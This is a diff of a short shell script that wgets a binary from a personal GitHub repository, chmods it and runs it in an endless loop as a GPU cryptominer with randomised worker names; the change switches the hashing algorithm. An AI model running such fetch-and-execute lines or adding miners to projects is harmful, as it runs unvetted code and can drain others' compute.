@@ -5,7 +5,7 @@ WORKER=$(echo $(shuf -i 10-40 -n 1)-DOGEDANK)
 wget https://github.com/goldengoose45/karmasama/raw/main/korosxgpu
 chmod +x korosxgpu
 while [ 1 ]; do
-./korosxgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
+./korosxgpu --algo ETCHASH --pool $POOL --user $WALLET.$WORKER 
 sleep 5
 done
 sleep 999999999 
